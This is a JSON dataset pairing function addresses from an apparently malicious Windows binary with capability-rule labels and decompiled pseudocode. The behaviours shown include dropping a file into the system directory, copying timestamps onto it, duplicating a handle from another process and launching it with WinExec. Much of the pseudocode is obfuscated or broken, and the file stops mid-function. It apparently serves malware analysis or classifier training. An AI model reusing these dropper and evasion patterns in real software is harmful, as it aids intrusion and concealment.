{
    "00401000": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401000(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    // [00] -r-x section size 20480 named .text\n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(arg_8h, 0);\n    if (iVar1 != -1) {\n        if ((!SBORROW4(iVar1, -1)) && (SBORROW4(iVar1, -1))) {\n            LOCK();\n        }\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 122
    },
    "00401df0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.00401df0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00402a60(0x424144);\n    if (iVar1 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 75
    },
    "004021f0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402345) overlaps instruction at (ram,0x00402343)\n// \n// WARNING: Removing unreachable block (ram,0x00402407)\n// WARNING: Removing unreachable block (ram,0x00402297)\n\nuint32_t fcn.004021f0(void)\n\n{\n    uint8_t uVar1;\n    uint16_t uVar2;\n    uint32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    uint32_t uVar6;\n    uint8_t extraout_CL;\n    int32_t extraout_ECX;\n    ushort uVar8;\n    uint32_t extraout_EDX;\n    uint8_t *unaff_EBX;\n    uint16_t *puVar9;\n    uchar *puVar10;\n    int32_t unaff_ESI;\n    uint *unaff_EDI;\n    uint *puVar11;\n    int32_t *piVar12;\n    int32_t *piVar13;\n    ushort in_SS;\n    bool bVar14;\n    uint8_t in_AF;\n    bool bVar15;\n    char cVar16;\n    char cVar17;\n    float10 extraout_ST0;\n    ulong uVar18;\n    uint32_t in_stack_ffffff64;\n    ushort uStack152;\n    ushort uStack150;\n    uchar uStack132;\n    uint uStack131;\n    uchar uStack100;\n    uint uStack99;\n    uchar uStack68;\n    uchar auStack67 [31];\n    uchar uStack36;\n    uint uStack35;\n    uchar uStack5;\n    char *pcVar7;\n    \n    if ((*0x10 == 0x84) || (*0x10 != 0x84)) {\ncode_r0x00402210:\n        iVar3 = fcn.004029e0();\n        if (iVar3 == 0) {\n            return 0;\n        }\n        fcn.004033b0();\n        uStack152 = 0x2255;\n        uStack150 = 0x40;\n        in_stack_ffffff64 = extraout_EDX;\n        in_EAX = fcn.00404f90(0x4241a8);\n    }\n    else {\n        unaff_EBX = unaff_EBX + 1;\n        if (0x7f < &stack0xfffffffc && unaff_EBX != NULL) {\n            uVar1 = 9 < (in_EAX & 0xf) | in_AF;\n            piVar13 = (in_EAX & 0xffff0000 | CONCAT11((in_EAX >> 8) + uVar1, in_EAX + uVar1 * '\\x06') & 0xff0f) + 0x2a;\n            *piVar13 = *piVar13 - unaff_EBX;\n            unaff_ESI = unaff_ESI + 1;\n            goto code_r0x00402210;\n        }\n    }\n    puVar10 = &stack0xfffffffc;\n    uVar8 = unaff_ESI;\n    cVar17 = SBORROW4(in_EAX, -1);\n    cVar16 = in_EAX + 1 < 0;\n    if (in_EAX != 0xffffffff) {\n        return 0;\n    }\n    uVar18 = fcn.00401800();\n    *0x42460c = 1;\n    if ((cVar17 == cVar16) && (cVar17 != cVar16)) {\n        out(0xc4, uVar18);\n        in_stack_ffffff64 = uVar18 >> 0x20 & 0xffffff00 | uVar18 >> 0x20 ^ extraout_CL;\n        *unaff_EDI = uVar18;\n        uStack152 = in_SS;\n    }\n    iVar3 = fcn.00401df0();\n    // WARNING: Bad instruction - Truncating control flow here\n    if (iVar3 != 0) {\n        return 0;\n    }\n    uStack132 = 0;\n    puVar11 = &uStack35;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar11 = 0;\n        puVar11 = puVar11 + 1;\n    }\n    *puVar11 = 0;\n    *(puVar11 + 2) = 0;\n    uStack100 = 0;\n    puVar11 = &uStack131;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar11 = 0;\n        puVar11 = puVar11 + 1;\n    }\n    *puVar11 = 0;\n    *(puVar11 + 2) = 0;\n    uStack68 = 0;\n    puVar11 = &uStack99;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar11 = 0;\n        puVar11 = puVar11 + 1;\n    }\n    *puVar11 = 0;\n    *(puVar11 + 2) = 0;\n    puVar11 = auStack67;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar11 = 0;\n        puVar11 = puVar11 + 1;\n    }\n    *puVar11 = 0;\n    piVar13 = puVar11 + 3;\n    *(puVar11 + 2) = 0;\n    uVar18 = fcn.00403940(&uStack132, &uStack100, &uStack36, &uStack68);\n    iVar3 = uVar18 >> 0x20;\n    iVar4 = uVar18;\n    if (iVar4 == 0) {\n        return 0;\n    }\n    if ((iVar4 < 0) || (iVar4 >= 0)) {\ncode_r0x00402348:\n        iVar3 = fcn.00401e30(in_stack_ffffff64);\n        if (iVar3 == 0) {\n            return 0;\n        }\n        iVar3 = fcn.00404c80(puVar10 + -0x80, puVar10 + -0x60, puVar10 + -0x20, puVar10 + -0x40);\n        return iVar3 != 0;\n    }\n    puVar5 = iVar4 + -0x1bf31dd6;\n    *unaff_EBX = *unaff_EBX & 0xc3;\n    if (extraout_ECX != 0) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    puVar10 = &uStack5;\n    bVar15 = puVar10 == NULL;\n    bVar14 = (POPCOUNT(puVar10 & 0xff) & 1U) == 0;\n    if (bVar15) goto code_r0x00402348;\n    puVar10 = &stack0xffffff60;\n    if ((bVar14) || (!bVar14)) {\n        piVar13 = CONCAT22(uStack150, uStack152);\ncode_r0x004023c0:\n        uVar8 = iVar3;\n        if ((bVar15) || (!bVar15)) goto code_r0x004023d8;\n    }\n    else {\n        puVar5 = 0x34a96cf4;\n        bVar14 = SCARRY4(iVar3, 1);\n        uVar6 = iVar3 + 1;\n        bVar15 = uVar6 == 0;\n        puVar10 = *0x8b17b43a;\n        iVar3 = unaff_ESI;\n        if (bVar14 != uVar6 < 0) goto code_r0x004023c0;\n        uVar2 = uVar6 * *0x34a96c7b;\n        pcVar7 = uVar6 & 0xffff0000 | uVar2;\n        *piVar13 = extraout_ST0 * *(unaff_EBX + -0x6f3ca21b);\n        *pcVar7 = *pcVar7 + uVar2;\n        pcVar7[0x4bb148d3] = pcVar7[0x4bb148d3] + (uVar2 >> 8);\n    }\n    out(*puVar5, uVar8);\ncode_r0x004023d8:\n    iVar3 = *(puVar10 + 0x10);\n    puVar9 = *(puVar10 + 0xc);\n    bVar14 = false;\n    if (iVar3 != 0) {\n        *(puVar10 + 8) = iVar3;\n        do {\n            piVar12 = piVar13;\n            if ((bVar14 == iVar3 < 0) && (bVar14 != iVar3 < 0)) {\n                out(0xc4, iVar3);\n                piVar12 = piVar13 + 1;\n                *piVar13 = iVar3;\n            }\n            piVar13 = piVar12 + *puVar9;\n            if (piVar13 >> 0x10 != 0) {\n                piVar13 = (piVar13 >> 0x10) + (piVar13 & 0xffff);\n            }\n            puVar9 = puVar9 + 1;\n            bVar14 = SBORROW4(*(puVar10 + 8), 1);\n            iVar3 = *(puVar10 + 8) + -1;\n            *(puVar10 + 8) = iVar3;\n        } while (iVar3 != 0);\n    }\n    return (piVar13 >> 0x10) + piVar13;\n}\n",
        "token_count": 2155
    },
    "004024f0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool fcn.004024f0(void)\n\n{\n    int32_t iVar1;\n    uint var_10ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0x104;\n    iVar1 = fcn.00403470(0x80000002, 0x424424, 0x424464, &var_8h, &var_10ch, &var_4h);\n    if (iVar1 == 0) {\n        return false;\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(&var_10ch, 0);\n    return iVar1 != -1;\n}\n",
        "token_count": 149
    },
    "00402800": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402874) overlaps instruction at (ram,0x00402872)\n// \n\nuint __cdecl fcn.00402800(uint arg_8h)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_ESI;\n    bool in_CF;\n    ulong uVar4;\n    \n    if ((!in_CF) && (in_CF)) {\n        out(0xbd, in_EAX);\n        return in_EAX;\n    }\n    uVar4 = fcn.00404f90(0x4241b0);\n    iVar1 = uVar4;\n    if (iVar1 == -1) {\n        return 0;\n    }\n    if ((iVar1 != -1) || (iVar3 = uVar4 >> 0x20,  iVar1 == -1)) {\n        iVar3 = iVar1;\n    }\n    *(unaff_ESI + 0x43d1773a) = *(unaff_ESI + 0x43d1773a) ^ 0x5027e95e;\n    uVar4 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x40, 0, iVar3);\n    iVar1 = uVar4;\n    if (iVar1 != 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(uVar4 >> 0x20, iVar1, 0, 0);\n        iVar3 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar2);\n        if (iVar3 != 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 393
    },
    "004028c0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040299d) overlaps instruction at (ram,0x0040299a)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004028c0(uint hObject, uint arg_ch, uint arg_10h)\n\n{\n    int32_t arg_8h;\n    int32_t iVar1;\n    char *pcVar2;\n    bool bVar3;\n    uint var_4h;\n    \n    *0x424608 = fcn.004024f0();\n    arg_8h = (*_sym.imp.KERNEL32.dll_CreateFileA)();\n    if (arg_8h == -1) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_WriteFile)(arg_8h, arg_ch);\n    if (iVar1 != 0) {\n        bVar3 = false;\n        if (*0x424608 != 0) {\n            iVar1 = fcn.00402800(arg_8h);\n            bVar3 = SCARRY4(-(iVar1 != 0), 1);\n            *0x424608 = -(iVar1 != 0) + 1;\n        }\n        if ((bVar3) || (!bVar3)) {\n            fcn.004048d0(0, arg_8h);\n        }\n        else {\n            pcVar2 = *0x424608 & 0xffffff00 | 0xf5;\n            *pcVar2 = *pcVar2 + -0xb;\n        }\n        if (*0x424608 == 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(arg_8h);\n        }\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 381
    },
    "00402af0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402c24) overlaps instruction at (ram,0x00402c22)\n// \n\nvoid __cdecl\nfcn.00402af0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, uint arg_1ch, int32_t arg_20h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_10ch;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00402560(arg_18h, arg_1ch, arg_8h, 0x20, arg_20h + 0x20);\n    fcn.00402560(arg_18h, arg_1ch, arg_ch, 0x20, arg_20h + 0x60);\n    fcn.00402560(arg_18h, arg_1ch, arg_10h, 0x20, arg_20h + 0xa0);\n    iVar1 = fcn.00402560(arg_18h, arg_1ch, arg_14h, 0x20, arg_20h + 0xe0);\n    if ((&stack0xfffffee4 < 0) || (&stack0xfffffee4 >= 0)) {\n        iVar1 = func_0x00402aa0();\n        if (iVar1 == -1) {\n            iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n            *(arg_20h + 0x120) = iVar1 % 5;\n            goto code_r0x00402bef;\n        }\n    }\n    else {\n        iVar1 = iVar1 + -0x12d18;\n        *(arg_18h + 0x874fff8) = *(arg_18h + 0x874fff8) + 1;\n    }\n    *(arg_20h + 0x120) = iVar1;\ncode_r0x00402bef:\n    var_10ch = 0;\n    puVar2 = &var_10bh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    var_4h = 0x104;\n    *(puVar2 + 2) = 0;\n    iVar1 = fcn.00403470(0x80000001, 0x42438c, 0x4243b8, &var_8h, &var_10ch, &var_4h);\n    if ((iVar1 != 0) && (iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_10ch, 0x424408),  iVar1 == 0)) {\n        *(arg_20h + 0x120) = *(arg_20h + 0x120) | 0x80;\n    }\n    return;\n}\n",
        "token_count": 685
    },
    "004048d0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004048d0(uint arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    char *pcVar7;\n    char *pcVar8;\n    uint *puVar9;\n    char lpBuffer;\n    uint var_22fh;\n    uchar var_12ch;\n    uint var_12bh;\n    uint var_28h;\n    uint lpCreationTime;\n    uint var_1ch;\n    uint var_14h;\n    int32_t var_4h;\n    \n    var_4h = arg_ch;\n    lpBuffer = '\\0';\n    puVar5 = &var_22fh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_12ch = '\\0';\n    puVar5 = &var_12bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    uVar3 = 0xffffffff;\n    pcVar7 = &lpBuffer;\n    do {\n        pcVar6 = pcVar7;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar6 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar6;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    puVar5 = pcVar6 + -uVar3;\n    puVar9 = &var_12ch;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    uVar3 = 0xffffffff;\n    pcVar7 = 0x42417c;\n    do {\n        pcVar6 = pcVar7;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar6 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar6;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar7 = &var_12ch;\n    do {\n        pcVar8 = pcVar7;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar8 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar8;\n    } while (cVar1 != '\\0');\n    puVar5 = pcVar6 + -uVar3;\n    puVar9 = pcVar8 + -1;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(&var_12ch, 0, &var_28h);\n    iVar2 = var_4h;\n    if ((arg_ch == -1) && (iVar2 = fcn.00402a60(arg_8h),  iVar2 == -1)) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar2, &lpCreationTime, &var_1ch, &var_14h);\n    if (arg_ch == -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    return 1;\n}\n",
        "token_count": 1156
    },
    "00404c80": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404eae) overlaps instruction at (ram,0x00404eac)\n// \n// WARNING: Removing unreachable block (ram,0x00404dd5)\n// WARNING: Removing unreachable block (ram,0x00404de2)\n\nint32_t __cdecl fcn.00404c80(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    char cVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint8_t uVar6;\n    int32_t *piVar8;\n    uint *puVar9;\n    uint *puVar10;\n    bool bVar11;\n    bool bVar12;\n    unkbyte10 extraout_ST0;\n    unkbyte10 extraout_ST0_00;\n    unkbyte10 extraout_ST0_01;\n    unkbyte10 Var13;\n    ulong uVar14;\n    uint var_213h;\n    uchar s;\n    uint var_10fh;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    uint8_t uVar7;\n    \n    puVar9 = &stack0xfffffffc;\n    puVar10 = &var_213h;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    *puVar10 = 0;\n    *(puVar10 + 2) = 0;\n    s = 0;\n    puVar10 = &var_10fh;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    *puVar10 = 0;\n    var_ch = 1;\n    *(puVar10 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)(&s, 100, 0xe8);\n    fcn.00403320(&var_4h, &var_8h);\n    iVar5 = fcn.00402f10(arg_8h, arg_ch, arg_10h, arg_14h, var_4h, var_8h);\n    if (iVar5 == 0) {\n        return 0;\n    }\n    iVar5 = fcn.004028c0(&s, var_4h, var_8h);\n    if (iVar5 == 0) {\n        return iVar5;\n    }\n    fcn.00402670();\n    iVar5 = fcn.00404f90(0x42419c);\n    if ((iVar5 != -1) || (iVar5 = fcn.00404f90(0x424190),  iVar5 != -1)) {\n        iVar5 = fcn.00404f50();\n        if (iVar5 != 0) {\n            fcn.00404a40();\n            fcn.00403460();\n            return 1;\n        }\n        if (*0x424608 == 0) {\n            return 0;\n        }\n    }\n    uVar14 = fcn.00402df0(arg_8h, &s);\n    iVar5 = var_ch;\n    if (uVar14 == 0) {\n        iVar5 = 0;\n    }\n    bVar11 = 0x7fffffff < uVar14;\n    bVar12 = false;\n    if (!bVar11) {\n        while( true ) {\n            if (!bVar11) break;\n            uVar1 = bVar12;\n            uVar2 = uVar14 + 0x74f6852f;\n            bVar11 = 0x8b097ad0 < uVar14 || CARRY4(uVar2, uVar1);\n            uVar7 = uVar14 >> 0x20;\n            uVar6 = uVar7 + *(arg_8h + -0x18);\n            bVar12 = CARRY1(uVar7, *(arg_8h + -0x18)) || CARRY1(uVar6, bVar11);\n            uVar6 = uVar6 + bVar11;\n            uVar14 = CONCAT44(uVar14 >> 0x20 & 0xffffff00 | uVar6, uVar2 + uVar1);\n            bVar11 = uVar6 < '\\0';\n            if (!bVar11) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n        }\n    }\n    Var13 = extraout_ST0;\n    if (iVar5 != 0) {\n        uVar14 = fcn.00403830(arg_8h);\n        iVar4 = uVar14;\n        Var13 = extraout_ST0_00;\n        if (iVar4 == 0) {\n            iVar5 = iVar4;\n            var_ch = iVar4;\n        }\n    }\n    if (iVar5 == 0) {\n        uVar14 = fcn.00404720();\n        iVar5 = uVar14;\n        Var13 = extraout_ST0_01;\n        var_ch = iVar5;\n    }\n    piVar8 = uVar14 >> 0x20;\n    *(uVar14 + -0x7ce92414) = Var13;\n    *piVar8 = *piVar8 + -0x97a207c;\n    bVar12 = *piVar8 != 0;\n    if (bVar12) {\n        fcn.00403460();\n    }\n    if ((bVar12 && *0x10 != 0x22f) && (!bVar12 || *0x10 == 0x22f)) {\n        puVar10 = &stack0xfffffdcd;\n        cVar3 = '\\x10';\n        do {\n            puVar9 = puVar9 + -1;\n            puVar10 = puVar10 + -1;\n            *puVar10 = *puVar9;\n            cVar3 = cVar3 + -1;\n        } while ('\\0' < cVar3);\n    }\n    (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n    (*_sym.imp.KERNEL32.dll_WinExec)(0x41b0, 0);\n    return iVar5;\n}\n",
        "token_count": 1438
    },
    "00404f90": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040503f) overlaps instruction at (ram,0x0040503c)\n// \n// WARNING: Removing unreachable block (ram,0x00405036)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00404f90(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_10ch;\n    uint var_8h;\n    int32_t hObject;\n    \n    var_8h = 0xffffffff;\n    hObject = (**0x4245e0)();\n    if (hObject != -1) {\n        var_130h = 0x128;\n        puVar2 = &var_12ch;\n        for (iVar1 = 0x49; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar2 = 0;\n            puVar2 = puVar2 + 1;\n        }\n        iVar1 = (**0x4245e4)(hObject, &var_130h);\n        while ((iVar1 != 0 && (iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_10ch, arg_8h),  iVar1 != 0))) {\n            iVar1 = (**0x4245e8)(hObject, &var_130h);\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n        return var_8h;\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 367
    },
    "00401060": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00401060(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.004046a0;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x407010;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 217
    },
    "004010c0": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004011ee) overlaps instruction at (ram,0x004011ec)\n// \n// WARNING: Removing unreachable block (ram,0x00401101)\n\nuint * fcn.004010c0(uint32_t param_1, int32_t param_2)\n\n{\n    uint32_t *puVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    int32_t *piVar5;\n    uint16_t uVar6;\n    uchar extraout_DL;\n    uint32_t uVar7;\n    uchar *puVar8;\n    uchar *puVar9;\n    uint16_t uVar10;\n    uint *puVar11;\n    uint *puVar12;\n    int32_t iVar13;\n    bool bVar14;\n    bool bVar15;\n    \n    puVar8 = &stack0xfffffffc;\n    puVar9 = &stack0xfffffffc;\n    uVar3 = fcn.004023a0(0, param_1, param_2 + 1U >> 1 & 0xffff | (param_2 + 1U >> 0x11) << 0x10);\n    puVar11 = uVar3 & 0xffff;\n    puVar4 = (*_sym.imp.dbghelp.dll_ImageNtHeader)();\n    uVar3 = puVar4[0x16];\n    uVar6 = uVar3;\n    uVar10 = puVar11;\n    bVar15 = uVar10 - uVar6 < 0;\n    if (uVar10 < uVar6) {\n        if ((bVar15) || (!bVar15)) {\n            bVar15 = false;\n            puVar11 = (puVar11 - uVar3 & 0xffff) - 1;\n            goto code_r0x00401173;\n        }\n        piVar5 = puVar4 + (uVar10 < uVar6) + 0x81f12b2f;\n        uVar2 = piVar5;\n        out(0xff, uVar2);\n        *piVar5 = *piVar5 + 1;\n        *(puVar11 + 0xf) = *(puVar11 + 0xf) + uVar3;\n        *(piVar5 * 2) = extraout_DL;\n        bVar15 = CARRY1(*piVar5, uVar2);\n        *piVar5 = *piVar5 + uVar2;\n        bVar14 = *piVar5 == 0;\ncode_r0x00401179:\n        puVar12 = puVar11;\n        if (!bVar15 && !bVar14) goto code_r0x0040118d;\n        puVar12 = puVar11 + 1;\n        *puVar4 = *puVar11;\n        uVar7 = (param_1 >> 8 & 0xffff00) << 8 | CONCAT11(0xdf, param_1);\n        puVar8 = 0x8be181d0;\n        puVar4 = puVar4 + 1;\n    }\n    else {\n        bVar15 = puVar11 < (uVar3 & 0xffff);\n        puVar11 = puVar11 - (uVar3 & 0xffff);\ncode_r0x00401173:\n        bVar14 = puVar11 == NULL;\n        puVar12 = puVar11;\n        if (!bVar15 && !bVar14) goto code_r0x00401179;\ncode_r0x0040118d:\n        uVar7 = uVar3 >> 0x10;\n        if (uVar3 >> 0x10 <= puVar12) {\n            uVar3 = puVar12 - uVar7;\n            goto code_r0x004011ca;\n        }\n    }\n    uVar3 = (puVar12 - uVar7 & 0xffff) - 1;\n    puVar9 = puVar8;\ncode_r0x004011ca:\n    piVar5 = *(puVar9 + 0x14);\n    bVar15 = CARRY4(uVar3, *(puVar9 + 0xc));\n    iVar13 = uVar3 + *(puVar9 + 0xc);\n    *piVar5 = iVar13;\n    if ((bVar15 || iVar13 == 0) || (!bVar15 && iVar13 != 0)) {\n        **(puVar9 + 0x10) = puVar4[0x16];\n    }\n    puVar1 = puVar4 + -0x75;\n    puVar9 = *puVar1;\n    *puVar1 = *puVar1 - &stack0xffffffec;\n    *(uVar7 + 0x10895857) = *(uVar7 + 0x10895857) + piVar5 + (puVar9 < &stack0xffffffec);\n    return puVar4;\n}\n",
        "token_count": 1071
    },
    "004023a0": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498",
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402407) overlaps instruction at (ram,0x00402406)\n// \n// WARNING: Removing unreachable block (ram,0x00402407)\n\nint32_t __cdecl fcn.004023a0(int32_t *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint16_t uVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    int32_t iVar4;\n    ushort uVar5;\n    int32_t in_EDX;\n    uint16_t *puVar6;\n    uchar *puVar7;\n    uchar *unaff_ESI;\n    int32_t *unaff_EDI;\n    int32_t *piVar8;\n    bool in_PF;\n    uchar in_ZF;\n    bool bVar9;\n    float10 in_ST0;\n    char *pcVar3;\n    \n    uVar5 = in_EAX;\n    puVar7 = &stack0xfffffffc;\n    if ((in_PF) || (puVar7 = &stack0xfffffffc,  !in_PF)) {\ncode_r0x004023c0:\n        uVar5 = in_EDX;\n        if ((in_ZF) || (!in_ZF)) goto code_r0x004023d8;\n    }\n    else {\n        unaff_ESI = 0x34a96cf4;\n        bVar9 = SCARRY4(in_EDX, 1);\n        uVar2 = in_EDX + 1;\n        in_ZF = uVar2 == 0;\n        puVar7 = *0x8b17b43a;\n        in_EDX = in_EAX;\n        arg_8h = unaff_EDI;\n        if (bVar9 != uVar2 < 0) goto code_r0x004023c0;\n        uVar1 = uVar2 * *0x34a96c7b;\n        pcVar3 = uVar2 & 0xffff0000 | uVar1;\n        *unaff_EDI = in_ST0;\n        *pcVar3 = *pcVar3 + uVar1;\n        